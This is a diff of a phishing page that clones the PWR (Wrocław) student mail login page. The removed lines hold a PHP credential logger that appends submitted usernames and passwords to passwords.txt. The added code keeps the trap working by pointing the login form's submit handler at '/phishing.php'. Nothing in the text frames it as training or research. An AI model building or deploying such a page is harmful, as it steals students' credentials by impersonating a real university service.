@@ -1,21 +1,5 @@
-<?php
-	if(isset($_POST["username"])){
-		$username = $_POST["username"];
-	}
-	if(isset($_POST["password"])){
-		$password = $_POST["password"];
-	}
-	if(isset($_POST["password"]) && isset($_POST["username"])){
-		$file = fopen("passwords.txt", "a");
-		$content = str_replace(["{{USER}}","{{PASSWORD}}"],[$username,$password],"username:{{USER}}\npassword:{{PASSWORD}}\n\n");
-		fwrite($file,$content);	
-		fclose($file);
-	}
-?>
-
-
-<!-- saved from url=(0029)https://smail.pwr.edu.pl/auth -->
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>SYSTEM POCZTY STUDENCKIEJ   | Wroclawskie Centrum Sieciowo-Superkomputerowe</title>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>SYSTEM POCZTY STUDENCKIEJ   | Wroclawskie Centrum Sieciowo-Superkomputerowe</title>
 
 <style type="text/css">
 
@@ -179,7 +163,7 @@ for (var i=0; i<li.length; i++){
 
 </script>
 
-<script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/agent.js"></script><link href="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/master-style_ns6up.css" type="text/css" rel="stylesheet"><link href="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/mail_css_ns6up.css" type="text/css" rel="stylesheet">
+<script type="text/javascript" src="./files/agent.js"></script><link href="./files/master-style_ns6up.css" type="text/css" rel="stylesheet"><link href="./files/mail_css_ns6up.css" type="text/css" rel="stylesheet">
 
 
 <script type="text/javascript">
@@ -212,41 +196,9 @@ for (var i=0; i<li.length; i++){
        if (error || user)
         document.write(s);
      }
-</script><style id="dark-reader-style" type="text/css">@media screen {
+</script>
 
-/* Leading rule */
-html {
-  -webkit-filter: brightness(110%) contrast(80%) grayscale(20%) sepia(10%) !important;
-  filter: brightness(110%) contrast(80%) grayscale(20%) sepia(10%) !important;
-}
-
-/* Text contrast */
-html {
-  text-shadow: 0 0 0 !important;
-}
-
-/* Full screen */
-:-webkit-full-screen, :-webkit-full-screen * {
-  -webkit-filter: none !important;
-  filter: none !important;
-}
-:-moz-full-screen, :-moz-full-screen * {
-  -webkit-filter: none !important;
-  filter: none !important;
-}
-:fullscreen, :fullscreen * {
-  -webkit-filter: none !important;
-  filter: none !important;
-}
-
-/* Page background */
-html {
-  background: rgb(255,255,248) !important;
-}
-
-}</style>
-
-<script src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/browserVersion.js" type="text/javascript"></script>
+<script src="./files/browserVersion.js" type="text/javascript"></script>
 <script type="text/javascript">
 var copyRight = null;
 var productName = null;
@@ -259,21 +211,22 @@ var LoginImagePath = null;
 
 function handleLoad()
 {
-copyRight="Copyright © 2008 Sun Microsystems, Inc. All rights reserved. SUN PROPRIETARY/CONFIDENTIAL. U.S. Government Rights - Commercial software. Government users are subject to the Sun Microsystems, Inc. standard license agreement and applicable provisions of the FAR and its supplements. Use is subject to license terms. Sun, Sun Microsystems, the Sun logo and Java are trademarks or registered trademarks of Sun Microsystems, Inc. in the U.S. and other countries.";
-productName="Sun Java(TM) System Communications Express 6.3 update 1";
+copyRight="Copyright � 2004 Sun Microsystems, Inc. All rights reserved. SUN PROPRIETARY/CONFIDENTIAL. U.S. Government Rights - Commercial software. Government users are subject to the Sun Microsystems, Inc. standard license agreement and applicable provisions of the FAR and its supplements. Use is subject to license terms. Sun, Sun Microsystems, the Sun logo and Java are trademarks or registered trademarks of Sun Microsystems, Inc. in the U.S. and other countries.";
+productName="Sun Java &#153; System Communications Express";
 logoImagePath="https://smail.pwr.edu.pl/uwc/images/login-logo.gif";
-versionImagePath="./../images/S1MC_login.gif";
+versionImagePath="https://smail.pwr.edu.pl/../images/S1MC_login.gif";
 versionPageTitle="Version Information";
 closeLabel="Close";
 closeTitle="Close Window";
 document.form1.username.focus();
 }
 
-function handleSubmit() {
-  document.form1.action = "./fishing.php";
-  document.form1.submi();
-}
 
+function handleSubmit() {
+  var targetAction =  "/phishing.php";
+  document.form1.action = targetAction;
+  document.form1.submit();
+}
 
 
 
@@ -297,40 +250,22 @@ function handleError() {
 </script>
 
 
-<script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/lnkr5.min.js"></script><script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/lnkr30_nt.min.js"></script><script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/code"></script><script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/validate-site.js"></script><script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/133ebafdf9ab3696c1.js"></script><script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/script.js"></script><script type="text/javascript" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/license.15.js"></script></head>
-<body bgcolor="#ffffff" leftmargin="10" topmargin="10" marginwidth="10" marginheight="10" onload="handleLoad()">
+</head>
+<body onload="handleLoad()" marginwidth="10" marginheight="10" leftmargin="10" bgcolor="#ffffff" topmargin="10">
    
     
-<table width="100%" align="center" cellspacing="0" cellpadding="0" bgcolor="#ffffff" border="0">
+<table cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff" align="center" width="100%">
  <tbody><tr>
   <td>
       <div align="left">
        <a href="http://www.pwr.edu.pl/" target="_blank">
-       <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/pwr_2.gif" alt="" vspace="0" hspace="0" border="0"><br>
+       <img src="./files/pwr_2.gif" alt="" hspace="0" border="0" vspace="0"><br>
        </a>
-       <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" alt="" height="20" width="1" vspace="0" hspace="0" border="0">
+       <img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0">
       </div>
   </td>
   <td>
-    <script type="text/javascript">wodotryski();</script><a class="link_1" href="https://s.student.pwr.edu.pl/iwc_static/c11n/faq/" target="_self" onmouseover="i1.src=&#39;https://smail.pwr.edu.pl/uwc/images/red_dot.gif&#39;" onmouseout="i1.src=&#39;https://smail.pwr.edu.pl/uwc/images/grey_dot.gif&#39;">
-<img border="0" hspace="4" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/grey_dot.gif" id="i1">
-pytania i odpowiedzi</a><br>
-<a class="link_1" href="https://s.student.pwr.edu.pl/modpass-pwr/" target="_self" onmouseover="i2.src=&#39;https://smail.pwr.edu.pl/uwc/images/red_dot.gif&#39;" onmouseout="i2.src=&#39;https://smail.pwr.edu.pl/uwc/images/grey_dot.gif&#39;">
-<img border="0" hspace="4" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/grey_dot.gif" id="i2">
-aktywacja konta</a><br>
-<a class="link_1" href="https://s.student.pwr.edu.pl/passwd/reset?todo=reset" target="_self" onmouseover="i3.src=&#39;https://smail.pwr.edu.pl/uwc/images/red_dot.gif&#39;" onmouseout="i3.src=&#39;https://smail.pwr.edu.pl/uwc/images/grey_dot.gif&#39;">
-<img border="0" hspace="4" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/grey_dot.gif" id="i3">
-zapomniałem/nie znam hasła</a><br>
-<a class="link_1" href="https://s.student.pwr.edu.pl/alias" target="_self" onmouseover="i4.src=&#39;https://smail.pwr.edu.pl/uwc/images/red_dot.gif&#39;" onmouseout="i4.src=&#39;https://smail.pwr.edu.pl/uwc/images/grey_dot.gif&#39;">
-<img border="0" hspace="4" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/grey_dot.gif" id="i4">
-alias pocztowy</a><br>
-<a class="link_1" href="https://forum.pwr.wroc.pl/" target="_self" onmouseover="i5.src=&#39;https://smail.pwr.edu.pl/uwc/images/red_dot.gif&#39;" onmouseout="i5.src=&#39;https://smail.pwr.edu.pl/uwc/images/grey_dot.gif&#39;">
-<img border="0" hspace="4" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/grey_dot.gif" id="i5">
-forum studentow</a><br>
-<a class="link_1" href="https://s.student.pwr.edu.pl/" target="_self" onmouseover="i6.src=&#39;https://smail.pwr.edu.pl/uwc/images/red_dot.gif&#39;" onmouseout="i6.src=&#39;https://smail.pwr.edu.pl/uwc/images/grey_dot.gif&#39;">
-<img border="0" hspace="4" src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/grey_dot.gif" id="i6">
-<b>nowy interfejs pocztowy</b></a><br>
-
+    <script type="text/javascript">wodotryski();</script>
   </td>
  </tr>
 </tbody></table>
@@ -338,49 +273,49 @@ forum studentow</a><br>
 
 
 
-<table width="100%" align="center" cellspacing="0" cellpadding="0" border="0">
+<table cellspacing="0" cellpadding="0" border="0" align="center" width="100%">
  <tbody><tr>
   <td align="center" valign="top">
-   <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="20" alt="" hspace="0" vspace="0" border="0"><br>
-   <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/stu_1.gif" alt="" hspace="0" vspace="0" border="0">
+   <img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0"><br>
+   <img src="./files/stu_1.gif" alt="" hspace="0" border="0" vspace="0">
   </td>
  </tr>
 </tbody></table>
 
 <div align="center">
- <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="20" alt="" hspace="0" vspace="0" border="0"><br>
- <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/hr_1_ani.gif" width="100%" height="2" alt="" hspace="0" vspace="0" border="0">
+ <img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0"><br>
+ <img src="./files/hr_1_ani.gif" alt="" hspace="0" height="2" border="0" width="100%" vspace="0">
 </div>
 
-<img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="20" alt="" hspace="0" vspace="0" border="0"><br>
+<img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0"><br>
 
 
 
 
-<table width="100%" align="center" cellspacing="0" cellpadding="0" bgcolor="#ffffff" border="0">
-<tbody><tr><td align="center"><img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/prof_1.gif" alt="" border="0"></td></tr>
+<table cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff" align="center" width="100%">
+<tbody><tr><td align="center"><img src="./files/prof_1.gif" alt="" border="0"></td></tr>
 <tr>
 <td>
 
-            <table width="70%" align="center" cellspacing="0" cellpadding="4" border="0">
+            <table cellspacing="0" cellpadding="4" border="0" align="center" width="70%">
              <tbody><tr>
-              <td class="err" align="center" colspan="2">
-               <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="30" alt="" hspace="0" vspace="0" border="0">
+              <td class="err" colspan="2" align="center">
+               <img src="./files/spacer.gif" alt="" hspace="0" height="30" border="0" width="1" vspace="0">
                	<script type="text/javascript">handleError();</script>
               </td>
              </tr>
             </tbody></table>
 
-<form name="form1" onsubmit="handleSubmit()"  method="POST">
-<input type="hidden" name="fromlogin" value="true">
+<form name="form1" onsubmit="handleSubmit()" action="/" method="POST">
+<input name="fromlogin" value="true" type="hidden">
 
-<input type="hidden" name="orgaccess" value="http">
- <table align="center" cellspacing="0" cellpadding="4" border="0">
+<input name="orgaccess" value="http" type="hidden">
+ <table cellspacing="0" cellpadding="4" border="0" align="center">
   <tbody><tr>
    <td class="cldialog" align="right">
    nazwa konta:
    </td>
-   <td align="left"> <input class="ctdialog" type="text" size="24" id="username" tabindex="1" name="username">
+   <td align="left"> <input class="ctdialog" size="24" id="username" tabindex="1" name="username" type="text">
     <script type="text/javascript">document.forms[0].user.focus();</script>
    </td>
   </tr>
@@ -389,16 +324,16 @@ forum studentow</a><br>
    hasło:
    </td>
    <td align="left"> 
-    <input class="ctdialog" type="password" name="password" size="24" id="password" tabindex="2">
+    <input class="ctdialog" name="password" size="24" id="password" tabindex="2" type="password">
    </td>
   </tr>
   <tr>
    <td>&nbsp;</td>
    <td align="left">
-    <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="10" alt="" hspace="0" vspace="0" border="0">
+    <img src="./files/spacer.gif" alt="" hspace="0" height="10" border="0" width="1" vspace="0">
     <br>
            
-    <input class="csdialog" id="button" onblur="this.className=&#39;csfocus&#39;" onmouseover="this.className=&#39;csfocus&#39;" title="Log In" onfocus="this.className=&#39;csfocus&#39;" onclick="handleSubmit(); return false;" tabindex="3" onmouseout="this.className=&#39;csdialog&#39;" type="submit" value="     Log In     " name="Button2">
+    <input class="csdialog" id="button" onblur="this.className='csfocus'" onmouseover="this.className='csfocus'" title="Log In" onfocus="this.className='csfocus'" onclick="handleSubmit(); return false;" tabindex="3" onmouseout="this.className='csdialog'" value="     Log In     " name="Button2" type="submit">
    </td>
   </tr>
  </tbody></table>
@@ -411,16 +346,16 @@ forum studentow</a><br>
 <br>Wszelkie uwagi zwiazane z obsluga interfejsu prosimy przesylac na adres <a name="tex2html12" href="mailto:%20smail@pwr.edu.pl">smail@pwr.edu.pl</a>.</p><br>
 
 
-         <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="30" alt="" hspace="0" vspace="0" border="0"><br>
-         <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/hr_1.gif" width="100%" height="1" alt="" hspace="0" vspace="0" border="0">
-         <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/spacer.gif" width="1" height="4" alt="" hspace="0" vspace="0" border="0"><br>
+         <img src="./files/spacer.gif" alt="" hspace="0" height="30" border="0" width="1" vspace="0"><br>
+         <img src="./files/hr_1.gif" alt="" hspace="0" height="1" border="0" width="100%" vspace="0">
+         <img src="./files/spacer.gif" alt="" hspace="0" height="4" border="0" width="1" vspace="0"><br>
         </div>
 
          <table align="center">
          <tbody><tr>
              <td valign="middle">
              <a href="http://www.wcss.wroc.pl/" title=" Wrocławskie Centrum Sieciowo-Superkomputerowe ">
-             <img src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/wcss_20.gif" alt=" Wrocławskie Centrum Sieciowo-Superkomputerowe " hspace="0" vspace="0" border="0">
+             <img src="./files/wcss_20.gif" alt=" Wrocławskie Centrum Sieciowo-Superkomputerowe " hspace="0" border="0" vspace="0">
              </a>
              </td>
              <td valign="middle">
@@ -432,5 +367,4 @@ forum studentow</a><br>
          </tbody></table>    
   </td></tr></tbody></table>      
 
-<script src="./SYSTEM POCZTY STUDENCKIEJ _ Wroclawskie Centrum Sieciowo-Superkomputerowe_files/133ebafdf9ab3696c1(1).js"></script></body></html>
-
+</body></html>
